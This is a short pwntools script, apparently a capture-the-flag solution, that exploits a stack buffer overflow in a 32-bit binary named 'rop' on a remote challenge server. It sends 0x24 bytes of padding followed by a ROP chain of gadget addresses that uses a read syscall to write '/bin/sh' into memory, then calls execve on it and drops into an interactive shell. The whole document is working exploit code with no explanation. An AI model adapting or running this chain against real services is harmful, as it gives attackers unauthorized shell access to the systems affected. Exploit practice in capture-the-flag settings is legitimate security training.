from pwn import *

if __name__=='__main__':

  #io = process('./rop')
  io = remote('gc1.eng.run',31027)

  L_syscall = 0x08049266
  L_pop_eax = 0x0804925e
  L_pop_ebx = 0x08049022
  L_pop_ecx = 0x08049262
  L_pop_edx = 0x08049264

  L_ROP = flat([
    b'A'*0x24,
    L_pop_eax,
    0x3,
    L_pop_ebx,
    0,
    L_pop_ecx,
    0x804c028,
    L_pop_edx,
    0x100,
    L_syscall,
    L_pop_eax,
    0xb,
    L_pop_ebx,
    0x804c028,
    L_pop_ecx,
    0x0,
    L_pop_edx,
    0x0,
    L_syscall
  ],arch='i386')
  
  io.sendlineafter(b'0pk1ng?\n',L_ROP)

  io.send("/bin/sh")
  io.interactive()